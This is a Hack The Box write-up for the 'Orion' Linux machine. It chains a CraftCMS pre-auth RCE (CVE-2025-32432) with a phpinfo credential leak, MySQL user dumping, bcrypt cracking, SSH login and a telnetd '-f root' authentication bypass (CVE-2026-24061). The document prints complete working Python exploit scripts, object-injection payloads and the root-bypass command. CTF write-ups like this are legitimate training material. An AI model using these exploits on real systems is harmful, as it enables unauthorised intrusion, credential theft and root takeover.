---
slug: "hackthebox/machines/htb-orion"
event: "hack-the-box-machines"
title: "HTB Orion Writeup"
summary: "Linux writeup chaining CraftCMS pre-auth RCE (CVE-2025-32432), a phpinfo environment leak, MySQL credential dumping, bcrypt cracking, and a telnetd authentication bypass (CVE-2026-24061) for root."
date: 2026-07-01
tags:
  - htb
  - linux
  - craftcms
  - cve-2025-32432
  - rce
  - phpinfo
  - mysql
  - bcrypt
  - hashcat
  - telnet
  - cve-2026-24061
  - privilege-escalation
category: "hack-the-box"
difficulty: "easy"
platform: "hackthebox"
draft: false
boxImage: "https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a217731f-ce7c-4015-ba0f-d68c7f6f7215-1782215994.png"
---

## Machine Overview

**Machine:** Orion  
**OS:** Linux  
**Difficulty:** Very Easy  
**Attack path:** CraftCMS RCE → phpinfo leak → MySQL credentials → bcrypt hash cracking → SSH as `adam` → localhost telnetd authentication bypass → root

Orion is a Linux machine running a vulnerable CraftCMS instance. The foothold comes from abusing **CVE-2025-32432**, a CraftCMS pre-authenticated RCE issue affecting Craft versions before `5.6.17`. NVD describes the vulnerability as remote code execution in Craft CMS and lists the fixed versions as `3.9.15`, `4.14.15`, and `5.6.17`. Craft’s own advisory also mentions suspicious exploitation attempts targeting `actions/assets/generate-transform`, which matched the endpoint used during exploitation.

After RCE, `phpinfo()` exposed Craft environment variables, including local MySQL credentials. Those credentials allowed dumping the Craft `users` table, cracking a bcrypt password, and logging in over SSH as `adam`. Root was obtained through **CVE-2026-24061**, a GNU Inetutils `telnetd` authentication bypass where the `USER` environment variable can be set to `-f root`. NVD describes this as a remote authentication bypass in GNU Inetutils `telnetd` through version `2.7`.

---

## Attack Chain Summary

```text
1. Enumerate TCP ports.
2. Discover CraftCMS on HTTP.
3. Identify vulnerable CraftCMS behavior.
4. Abuse CVE-2025-32432 to trigger phpinfo().
5. Extract Craft environment variables from phpinfo().
6. Use leaked MySQL root credentials locally through RCE.
7. Dump Craft users table.
8. Crack bcrypt hash for adam.
9. SSH as adam.
10. Find localhost-only telnetd.
11. Abuse CVE-2026-24061 with telnet -a -l "-f root".
12. Read root flag.
```

---

## 1. Enumeration

### Nmap Scan

I started with a focused scan against the target.

```bash
nmap -sC -sV -oA scans/services orion.htb
```

Important services:

```text
22/tcp open  ssh   OpenSSH 8.9p1 Ubuntu
80/tcp open  http  nginx 1.18.0
```

Later, I also checked common pivot ports:

```bash
nmap -Pn -p3306,23,22,80 -sV orion.htb
```

Result:

```text
22/tcp   open    ssh
23/tcp   closed  telnet
80/tcp   open    http
3306/tcp closed  mysql
```

This mattered because MySQL and Telnet were not externally reachable. So if MySQL credentials were found later, I would need to use them from the target itself, not directly from Kali.

---

## 2. Web Enumeration

Browsing to:

```text
http://orion.htb
```

showed the Orion Telecom website. The interesting part was the CraftCMS backend:

```text
/admin/login
```

The login page identified CraftCMS. From the version information, the target was running a vulnerable CraftCMS build in the affected range for **CVE-2025-32432**.

### Why CraftCMS Was Interesting

CraftCMS had a known pre-authenticated RCE through the image transform endpoint:

```text
/actions/assets/generate-transform
```

The bug chain abuses Yii object creation behavior through crafted JSON. In this box, the useful gadget path was:

```text
craft\behaviors\FieldLayoutBehavior
GuzzleHttp\Psr7\FnStream
yii\rbac\PhpManager
```

The first successful primitive was calling `phpinfo()` through `FnStream`.

---

## 3. Initial Exploit Attempts and Debugging

I first tried public PoCs.

### Exploit-DB PoC

Searchsploit showed:

```text
Craft CMS 5.6.16 - RCE | multiple/webapps/52525.py
```

But running the Exploit-DB PoC failed:

```bash
python3 52525.py -u http://orion.htb -c 'id'
```

Output:

```text
[-] Failed to obtain PHPSESSID
```

This happened because the PoC expected a `PHPSESSID` cookie, but Orion used:

```text
CraftSessionId
```

So the exploit logic was close, but not directly compatible with this target.

### Log Poisoning PoC

Another PoC tried to poison:

```text
/var/log/nginx/access.log
```

The issue was that the log was already polluted by an older PHP block containing `exit;`. Because PHP processes the file from the beginning, the old `exit;` stopped execution before the new payload could run. The PoC repeatedly reported that markers were not found and that the access log was polluted.

This was the important decision point: instead of wasting time patching the access log approach, I switched to the intended Craft object-injection chain.

---

## 4. Confirming Code Execution with phpinfo()

The first working payload used `FnStream` to call `phpinfo()`.

### PHPInfo Exploit

```bash
cat > orion_phpinfo.py <<'PY'
#!/usr/bin/env python3
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = "http://orion.htb"
ASSET_ID = 2

s = requests.Session()
s.verify = False
s.headers.update({
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json, text/html,*/*",
})

r = s.get(f"{BASE}/actions/users/session-info", headers={"Accept": "application/json"}, timeout=10)
j = r.json()

csrf_name = j.get("csrfTokenName", "CRAFT_CSRF_TOKEN")
csrf_value = j["csrfTokenValue"]

print(f"[+] CSRF name : {csrf_name}")
print(f"[+] CSRF value: {csrf_value[:40]}...")

payload = {
    "assetId": ASSET_ID,
    "handle": {
        "width": 123,
        "height": 123,
        "as g10d": {
            "class": "craft\\behaviors\\FieldLayoutBehavior",
            "__class": "GuzzleHttp\\Psr7\\FnStream",
            "__construct()": [[]],
            "_fn_close": "phpinfo"
        }
    },
    csrf_name: csrf_value
}

headers = {
    "Content-Type": "application/json",
    "X-CSRF-Token": csrf_value,
    "X-Requested-With": "XMLHttpRequest",
}

url = f"{BASE}/actions/assets/generate-transform"
r = s.post(url, json=payload, headers=headers, timeout=20)

print(f"[+] HTTP {r.status_code}")
open("phpinfo.html", "w", encoding="utf-8", errors="ignore").write(r.text)

if "PHP Version" in r.text:
    print("[+] phpinfo() executed. Saved: phpinfo.html")
else:
    print("[-] phpinfo marker not found.")
    print(r.text[:1000])
PY

python3 orion_phpinfo.py
```

Output:

```text
[+] CSRF name : CRAFT_CSRF_TOKEN
[+] CSRF value: 8gug6CUKCG-2VJLPNX9g_BhiIhfIH6DdefRepd0B...
[+] HTTP 200
[+] phpinfo() executed. Saved: phpinfo.html
```

This proved the CraftCMS object injection was working.

### Why phpinfo() Worked

`FnStream` can call a PHP function when the object is destroyed. `phpinfo()` is useful because it takes no required arguments. That is why it worked immediately.

A direct `system("id")` style payload did not work through the same `FnStream` path, because `system()` needs an argument. So the next goal was to leak environment variables from `phpinfo()`.

---

## 5. Extracting Craft Environment Variables

I parsed `phpinfo.html` for useful values:

```bash
python3 - <<'PY'
import re, html

data = open("phpinfo.html", encoding="utf-8", errors="ignore").read()

rows = re.findall(
    r'<tr><td class="e">([^<]+)</td><td class="v">([^<]*)</td></tr>',
    data
)

keywords = [
    "CRAFT", "DB", "DATABASE", "MYSQL", "MARIADB",
    "USER", "PASS", "PASSWORD", "SECURITY", "KEY",
    "DSN", "HOST", "SERVER", "ENV", "DOCUMENT_ROOT",
    "SCRIPT_FILENAME"
]

for k, v in rows:
    kk = html.unescape(k)
    vv = html.unescape(v)
    line = f"{kk}={vv}"
    if any(word.lower() in line.lower() for word in keywords):
        print(line)
PY
```

Important leaked values:

```text
USER=www-data
CRAFT_ENVIRONMENT=dev
CRAFT_SECURITY_KEY=RRS86F6i2JQKdC6kfEI7frVxA47WVMx8
CRAFT_DB_DRIVER=mysql
CRAFT_DB_SERVER=127.0.0.1
CRAFT_DB_PORT=3306
CRAFT_DB_DATABASE=orion
CRAFT_DB_USER=root
CRAFT_DB_PASSWORD=[REDACTED_PASSWORD]
```

The phpinfo output confirmed the Craft DB configuration, including local MySQL on `127.0.0.1:3306`, database `orion`, user `root`, and password `[REDACTED_PASSWORD]`.

### Why This Was Important

Since external port `3306` was closed, I could not connect to MySQL directly from Kali. But with RCE as `www-data`, I could execute the `mysql` client locally on the target and query the database.

---

## 6. Building Reliable RCE

The successful full RCE used a two-stage session poisoning method:

1. Send raw PHP into the Craft session.

2. Force Yii `PhpManager` to include the session file.


The working session file path on Orion was:

```text
/var/lib/php/sessions/sess_<CraftSessionId>
```

Not:

```text
/tmp/sess_<CraftSessionId>
```

### Working RCE Script

```bash
cat > orion_rce_raw.py <<'PY'
#!/usr/bin/env python3
import argparse
import base64
import urllib.parse
import urllib3
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _raw_request(self, conn, method, url, **kw):
    url = urllib.parse.unquote(url)
    return self._orig_req(conn, method, url, **kw)

urllib3.connectionpool.HTTPConnectionPool._orig_req = urllib3.connectionpool.HTTPConnectionPool._make_request
urllib3.connectionpool.HTTPConnectionPool._make_request = _raw_request

BASE = "http://orion.htb"
ASSET_ID = 2

def get_csrf_from_session_info(s):
    r = s.get(
        f"{BASE}/actions/users/session-info",
        headers={"Accept": "application/json"},
        verify=False,
        timeout=10
    )
    j = r.json()
    return j.get("csrfTokenName", "CRAFT_CSRF_TOKEN"), j["csrfTokenValue"]

def exploit(cmd):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0"})

    b64 = base64.b64encode(cmd.encode()).decode()
    php = f'<?=print("===START===\\n");system(base64_decode("{b64}"));print("\\n===END===");die();?>'

    poison_url = f"{BASE}/index.php?p=admin/dashboard&a={php}"

    print("[*] Poisoning Craft session with raw PHP payload")
    r = s.get(poison_url, allow_redirects=True, verify=False, timeout=10)

    sid = s.cookies.get("CraftSessionId")
    if not sid:
        raise SystemExit("[-] No CraftSessionId")

    print(f"[+] CraftSessionId: {sid}")

    csrf_name, csrf_value = get_csrf_from_session_info(s)
    print(f"[+] CSRF: {csrf_value[:40]}...")

    for session_file in [
        f"/tmp/sess_{sid}",
        f"/var/lib/php/sessions/sess_{sid}",
    ]:
        print(f"[*] Trying itemFile: {session_file}")

        body = {
            "assetId": ASSET_ID,
            "handle": {
                "width": 1,
                "height": 1,
                "as g10d": {
                    "class": "craft\\behaviors\\FieldLayoutBehavior",
                    "__class": "yii\\rbac\\PhpManager",
                    "__construct()": [
                        {
                            "itemFile": session_file
                        }
                    ]
                }
            },
            csrf_name: csrf_value
        }

        r = s.post(
            f"{BASE}/index.php?p=actions/assets/generate-transform",
            json=body,
            headers={
                "X-CSRF-Token": csrf_value,
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json"
            },
            verify=False,
            timeout=20
        )

        open("rce_raw_response.html", "w", encoding="utf-8", errors="ignore").write(r.text)

        if "===START===" in r.text:
            out = r.text.split("===START===", 1)[1].split("===END===", 1)[0]
            print("[+] RCE WORKED")
            print(out.strip())
            return

        print(f"[-] HTTP {r.status_code}, no marker")

    print("[-] RCE marker not found. Saved last response to rce_raw_response.html")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("-c", "--cmd", required=True)
    args = ap.parse_args()
    exploit(args.cmd)

if __name__ == "__main__":
    main()
PY

chmod +x orion_rce_raw.py
```

### RCE Test

```bash
python3 orion_rce_raw.py -c 'id'
```

Output:

```text
[*] Poisoning Craft session with raw PHP payload
[+] CraftSessionId: u7f2bf7njfulm97camtl40btn8
[+] CSRF: k4Sq3JkjCM4RqokV1eFhs__5o41oBUiTCwmnRCS4...
[*] Trying itemFile: /tmp/sess_u7f2bf7njfulm97camtl40btn8
[-] HTTP 500, no marker
[*] Trying itemFile: /var/lib/php/sessions/sess_u7f2bf7njfulm97camtl40btn8
[+] RCE WORKED
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now I had command execution as:

```text
www-data
```

---

## 7. Dumping the MySQL Database

Using the leaked credentials, I queried local MySQL through RCE:

```bash
python3 orion_rce_raw.py -c 'mysql -uroot -p[REDACTED_PASSWORD] orion -e "SHOW TABLES;"'
```

Output included many CraftCMS tables:

```text
addresses
announcements
assets
entries
sessions
users
usergroups
userpermissions
...
```

The key table was:

```text
users
```

So I dumped it:

```bash
python3 orion_rce_raw.py -c 'mysql -uroot -p[REDACTED_PASSWORD] orion -e "SELECT id,username,email,password FROM users;"'
```

Output:

```text
id  username  email           password
1   admin     adam@orion.htb  [REDACTED_HASH]
```

The email revealed a likely Linux user:

```text
adam
```

---

## 8. Cracking the Craft Hash

The hash started with:

```text
$2y$13$
```

That means bcrypt. In Hashcat, bcrypt uses mode `3200`.

I saved the hash:

```bash
cat > hash.txt <<'EOF'
[REDACTED_HASH]
EOF
```

Then cracked it:

```bash
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 3200 hash.txt --show
```

Result:

```text
[REDACTED_HASH]:[REDACTED_PASSWORD]
```

Credentials:

```text
adam : [REDACTED_PASSWORD]
```

---

## 9. SSH as Adam

Before SSH, I confirmed `adam` existed:

```bash
python3 orion_rce_raw.py -c 'cat /etc/passwd | grep -E "bash|sh$"'
```

Output:

```text
root:x:0:0:root:/root:/bin/bash
adam:x:1000:1000::/home/adam:/bin/bash
```

Then I logged in:

```bash
ssh adam@orion.htb
```

Password:

```text
[REDACTED_PASSWORD]
```

After login:

```bash
id
hostname
cat /home/adam/user.txt
```

Output:

```text
uid=1000(adam) gid=1000(adam) groups=1000(adam)
orion
[REDACTED_FLAG]
```

This confirmed user access and the user flag.

---

## 10. Privilege Escalation Enumeration

Since the machine description hinted at Telnetd, I checked local services:

```bash
ss -lntp | grep -E ':23|telnet'
dpkg -l | grep -Ei 'inetutils|telnet'
systemctl status inetutils-inetd 2>/dev/null
find / -name '*telnet*' 2>/dev/null
```

Important output:

```text
LISTEN 0 10 127.0.0.1:23 0.0.0.0:*
ii  inetutils-inetd  2:2.2-2ubuntu0.2
/usr/local/sbin/telnetd
/usr/libexec/telnetd
```

This showed Telnet was only listening on localhost:

```text
127.0.0.1:23
```

That explains why external Nmap showed port 23 as closed. The service was not exposed externally, but it was reachable from the SSH session as `adam`. The local enumeration also confirmed `inetutils-inetd` was active and telnet-related binaries existed on the system.

---

## 11. Understanding CVE-2026-24061

CVE-2026-24061 is an authentication bypass in GNU Inetutils `telnetd`. NVD describes the issue as `telnetd` in GNU Inetutils through `2.7` allowing remote authentication bypass via a `"-f root"` value for the `USER` environment variable.

The reason this works is that `telnetd` passes the attacker-controlled username into the system login process. If the username becomes:

```text
-f root
```

then `/bin/login` interprets it as:

```text
login -f root
```

The `-f` option means “pre-authenticated user,” so login skips the password check and gives a root shell. Censys describes this as improper sanitization of the `USER` environment variable before passing it to `login(1)`, allowing `-f root` to log in as root.

---

## 12. Exploiting Telnetd

My first attempt failed:

```bash
telnet -l '-froot' 127.0.0.1
```

Output:

```text
Usage: login [-p] [name]
       login [-p] [-h host] [-f name]
       login [-p] -r host
Connection closed by foreign host.
```

The mistake was subtle:

```text
-froot
```

is not the same as:

```text
-f root
```

The space matters because `login` expects `-f` and the username as separate arguments.

The working command was:

```bash
telnet -a -l "-f root" 127.0.0.1
```

That dropped me into a root shell:

```text
root@orion:~#
```

Then:

```bash
id
whoami
cat /root/root.txt
```

Output:

```text
uid=0(root) gid=0(root) groups=0(root)
root
[REDACTED_FLAG]
```

The final successful exploitation and root flag are shown in the terminal output.

---

## Flags

```text
user.txt: [REDACTED_FLAG]
root.txt: [REDACTED_FLAG]
```

---

## Key Takeaways

### 1. Do not blindly trust public PoCs

The first PoCs failed because they made assumptions that did not match Orion:

```text
PHPSESSID expected, but target used CraftSessionId
/tmp session path tested, but target used /var/lib/php/sessions
access.log poisoning failed because old PHP exit blocks broke execution
```

The fix was not to keep retrying the same exploit. The fix was to understand the vulnerability chain and adapt it.

### 2. phpinfo() can be a powerful foothold primitive

Even when full command execution was not immediately working, `phpinfo()` leaked:

```text
CRAFT_DB_SERVER
CRAFT_DB_DATABASE
CRAFT_DB_USER
CRAFT_DB_PASSWORD
CRAFT_SECURITY_KEY
```

That gave the next step: database access.

### 3. Local-only services still matter

External scan showed:

```text
23/tcp closed
3306/tcp closed
```

But internally:

```text
127.0.0.1:23 open
127.0.0.1:3306 used by Craft
```

So SSH access changed the attack surface.

### 4. Password reuse completed the foothold

The Craft user was:

```text
admin / adam@orion.htb
```

The cracked password:

```text
[REDACTED_PASSWORD]
```

worked for the Linux user:

```text
adam
```

### 5. Small argument formatting mistakes matter

This failed:

```bash
telnet -l '-froot' 127.0.0.1
```

This worked:

```bash
telnet -a -l "-f root" 127.0.0.1
```

The exploit required the argument split to become:

```text
-f root
```

not:

```text
-froot
```

---

## Final Attack Path

```text
CraftCMS 5.6.16
    ↓
CVE-2025-32432 via actions/assets/generate-transform
    ↓
FnStream phpinfo()
    ↓
Leak Craft DB credentials
    ↓
RCE executes local mysql client
    ↓
Dump Craft users table
    ↓
Crack bcrypt hash: [REDACTED_PASSWORD]
    ↓
SSH as adam
    ↓
Find localhost telnetd
    ↓
CVE-2026-24061: telnet -a -l "-f root" 127.0.0.1
    ↓
root
```

![screenshot-2026-07-01-211011](/images/writeups/hackthebox/orion/screenshot-2026-07-01-211011.png)
